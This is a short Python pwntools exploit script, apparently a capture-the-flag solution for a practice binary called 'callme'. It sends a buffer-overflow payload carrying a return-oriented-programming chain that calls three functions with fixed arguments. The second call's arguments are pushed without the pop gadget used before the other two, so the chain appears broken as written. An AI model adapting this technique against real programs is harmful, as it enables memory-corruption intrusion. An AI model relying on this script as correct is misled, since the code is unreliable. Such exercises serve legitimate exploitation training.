from pwn import * 

target = process("./callme")

payload = b"A" * 40
pop_rdi=0x0040093c
pop_rsi =0x0040093d
pop_rdx = 0x0040093e
ret = 0x0040093f
callone = 0x0400720
calltwo = 0x00400740
callthree = 0x004006f0


payload += p64(pop_rdi) #
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)

payload += p64(callone)
payload += p64(ret)

payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
#payload += p64(ret)


payload += p64(calltwo)
payload += p64(ret)

payload += p64(pop_rdi) #
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)

payload += p64(callthree)
payload += p64(ret)


target.sendline(payload)


target.interactive()


